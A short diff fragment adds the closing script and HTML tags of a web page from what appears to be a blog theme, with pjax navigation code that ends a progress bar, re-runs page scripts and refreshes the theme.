+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
